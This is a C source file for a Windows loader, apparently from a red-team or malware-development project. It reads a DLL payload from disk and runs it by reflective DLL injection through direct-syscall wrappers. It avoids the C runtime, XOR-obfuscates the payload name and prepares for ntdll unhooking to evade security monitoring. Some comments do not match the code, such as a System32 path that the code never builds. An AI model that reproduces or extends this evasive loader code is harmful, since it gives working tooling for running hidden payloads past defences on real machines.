#include "../include/common_defines.h" // Should be the very first include

#include "../include/rtldr_ctx.h"
#include "../include/utils.h"    // For find_module_base, find_function, ReadPayloadFileToMemory (this file)
#include "../include/syscalls.h" // For all Nt* syscall wrappers and status codes
#include "../include/mem.h"      // For wrapped_NtAllocateVirtualMemory, wrapped_NtFreeVirtualMemory (if not directly via syscalls.h)
#include "../include/evasion.h"  // For unhook_ntdll etc.
#include "../include/rdi.h"      // For InvokeReflectiveLoader (will be called from here)
#ifdef _DEBUG
#include <stdio.h>
#endif
#include <winternl.h>

// --- No-CRT memcpy implementation ---
#pragma function(memcpy)
void *memcpy(void *dst, const void *src, size_t n) {
    unsigned char *d = dst;
    const unsigned char *s = src;
    while (n--) *d++ = *s++;
    return dst;
}

// Custom string functions (no-CRT)
static WCHAR *pe_wstrcpy(WCHAR *dst, const WCHAR *src) {
    WCHAR *d = dst;
    while ((*d++ = *src++));
    return dst;
}

static WCHAR *pe_wstrcat(WCHAR *dst, const WCHAR *src) {
    WCHAR *d = dst;
    while (*d) d++;
    while ((*d++ = *src++));
    return dst;
}

// Simple XOR string decryption (compile-time encryption needed via build script)
static void xor_decrypt_wstring(LPWSTR str, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

// Implementation for ReadPayloadFileToMemory
BOOL ReadPayloadFileToMemory(PRTLDR_CTX ctx, LPCWSTR pwszFileName, PBYTE* ppPayloadBuffer, PDWORD pdwPayloadSize) {
    if (!ctx || !ctx->syscalls_initialized || !pwszFileName || !ppPayloadBuffer || !pdwPayloadSize) {
        return FALSE;
    }

    *ppPayloadBuffer = NULL;
    *pdwPayloadSize = 0;

    HANDLE hFile = NULL;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatusBlock;
    UNICODE_STRING uFileName;

    SIZE_T fileNameLength = 0;
    LPCWSTR p = pwszFileName;
    while (*p) { fileNameLength++; p++; }

    uFileName.Buffer = (PWSTR)pwszFileName;
    uFileName.Length = (USHORT)(fileNameLength * sizeof(WCHAR));
    uFileName.MaximumLength = uFileName.Length;
    
    InitializeObjectAttributes(&objAttr, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = wrapped_NtCreateFile(&hFile, FILE_GENERIC_READ, &objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    FILE_STANDARD_INFORMATION fileStdInfo;
    status = wrapped_NtQueryInformationFile(hFile, &ioStatusBlock, &fileStdInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
    if (!NT_SUCCESS(status)) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    DWORD fileSize = fileStdInfo.EndOfFile.LowPart;
    if (fileSize == 0) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    PVOID pBuffer = NULL;
    SIZE_T regionSize = fileSize;
    status = wrapped_NtAllocateVirtualMemory(NtCurrentProcess(), &pBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !pBuffer) {
        wrapped_NtClose(hFile);
        return FALSE;
    }

    status = wrapped_NtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, pBuffer, fileSize, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        SIZE_T actualRegionSize = regionSize; 
        wrapped_NtFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &actualRegionSize, MEM_RELEASE);
        wrapped_NtClose(hFile);
        return FALSE;
    }

    *ppPayloadBuffer = (PBYTE)pBuffer;
    *pdwPayloadSize = fileSize;
    wrapped_NtClose(hFile);
    return TRUE;
}

static void debug_message(const char* msg) {
    #ifdef _DEBUG
    MessageBoxA(NULL, msg, "PE_DEBUG", MB_OK);
    #endif
}

static BOOL build_payload_nt_path(WCHAR *outBuf, SIZE_T outCch)
{
    PPEB peb = (PPEB)__readgsqword(0x60);
    if(!peb) return FALSE;
    PRTL_USER_PROCESS_PARAMETERS pParams = peb->ProcessParameters;
    if(!pParams) return FALSE;
    UNICODE_STRING img = pParams->ImagePathName;
    if(img.Length/sizeof(WCHAR) >= outCch-10) return FALSE;
    // copy until last backslash
    SIZE_T i=0; SIZE_T lastBS=0;
    for(; i< img.Length/sizeof(WCHAR); ++i){
        outBuf[i]=img.Buffer[i]; if(outBuf[i]==L'\\') lastBS=i;
    }
    outBuf[lastBS+1]=0; // truncate after last backslash
    pe_wstrcat(outBuf, L"test_payload.dll");
    // prepend NT prefix
    WCHAR tmp[260]; pe_wstrcpy(tmp, outBuf);
    pe_wstrcpy((WCHAR*)outBuf, (const WCHAR*)L"\\??\\");
    pe_wstrcat((WCHAR*)outBuf, (const WCHAR*)tmp);
    return TRUE;
}

// Main function of the core loader logic
int CoreLoaderMain(void) {
    rtldr_ctx_t ctx_val;
    PRTLDR_CTX ctx = &ctx_val;

    // Initialize context: ntdll_base
    ctx->ntdll_base = find_module_base(L"ntdll.dll");
    if (!ctx->ntdll_base) {
        // Critical failure: cannot find ntdll
        return -2; 
    }
    ctx->syscalls_initialized = FALSE; // Initialize to FALSE

    // Initialize syscalls (this caches syscall IDs)
    ctx->syscalls_initialized = initialize_syscalls(ctx);
    if (!ctx->syscalls_initialized) {
        // Critical failure: cannot initialize syscalls
        return -3;
    }

    // TODO: Implement unhook_ntdll and call it here if desired early
    // For now, focus on RDI first
    // if (!unhook_ntdll(ctx->ntdll_base)) {
    //     // Log: Failed to unhook ntdll, but continuing
    // }

    PBYTE pPayloadBuffer = NULL;
    DWORD dwPayloadSize = 0;
    BOOL bReadSuccess = FALSE;

    // XOR encrypted payload name - "test_payload.dll" encrypted with key 0x42
    // In production, this should be done at compile time via build script
    WCHAR encryptedPayloadName[] = {
        L't' ^ 0x42, L'e' ^ 0x42, L's' ^ 0x42, L't' ^ 0x42, L'_' ^ 0x42,
        L'p' ^ 0x42, L'a' ^ 0x42, L'y' ^ 0x42, L'l' ^ 0x42, L'o' ^ 0x42,
        L'a' ^ 0x42, L'd' ^ 0x42, L'.' ^ 0x42, L'd' ^ 0x42, L'l' ^ 0x42,
        L'l' ^ 0x42, L'\0'
    };
    
    // Decrypt payload name
    xor_decrypt_wstring(encryptedPayloadName, 16, 0x42);
    LPCWSTR payloadName = encryptedPayloadName;

    // Build full NT path: \??\C:\Windows\System32\test_payload.dll
    WCHAR ntFullPath[260];
    if(!build_payload_nt_path(ntFullPath,260)) return -4;

    bReadSuccess = ReadPayloadFileToMemory(ctx, ntFullPath, &pPayloadBuffer, &dwPayloadSize);

    if (bReadSuccess && pPayloadBuffer && dwPayloadSize > 0) {
        #ifdef _DEBUG
        char buf[128];
        sprintf_s(buf, sizeof(buf), "Read payload (%lu bytes)", dwPayloadSize);
        debug_message(buf);
        #endif
        
        // InvokeReflectiveLoader now needs PRTLDR_CTX and LPVOID pParameter
        // Pass NULL for pParameter for now.
        NTSTATUS rdiStatus = InvokeReflectiveLoader(ctx, pPayloadBuffer, "ReflectiveLoader", NULL);

        if (NT_SUCCESS(rdiStatus)) {
            debug_message("InvokeReflectiveLoader SUCCESS");
            // The MessageBox from test_payload.dll should appear now.
        } else {
            debug_message("InvokeReflectiveLoader FAILED");
        }

        // Free the buffer that held the DLL file content
        SIZE_T regionSizeToFree = dwPayloadSize; // Use actual size for MEM_RELEASE if allocated with that size
                                               // Or, if allocation was page-aligned, it might be slightly larger.
                                               // NtFreeVirtualMemory with MEM_RELEASE needs the base and 0 size, 
                                               // or base and original allocation size.
        PVOID bufferToFree = pPayloadBuffer;
        SIZE_T sizeForFree = 0; // For MEM_RELEASE, size must be 0 if freeing the entire region from allocation base.
                               // If pPayloadBuffer is indeed the base of allocation, and regionSize from allocation is dwPayloadSize (or rounded up) then this is fine.
                               // More robust: if NtAllocateVirtualMemory returned a rounded up size, use that. 
                               // For now, assuming dwPayloadSize or 0 for MEM_RELEASE.

        // When MEM_RELEASE is specified, dwSize must be zero. 
        // The entire region that was reserved by NtAllocateVirtualMemory is released.
        // The BaseAddress parameter must be the base address returned by NtAllocateVirtualMemory when the region was reserved.
        NTSTATUS status = wrapped_NtFreeVirtualMemory(NtCurrentProcess(), &bufferToFree, &sizeForFree, MEM_RELEASE);
        if (!NT_SUCCESS(status)) {
            // Optionally log: "Failed to free payload buffer memory. Status: %X\n", status
        }

    } else {
        debug_message("Failed to read payload file");
    }

    // Loader has done its main job. 
    // The stub (RealEntry) will call NtTerminateProcess after this returns.
    return 0; // Success
}

// ... rest of the file ... 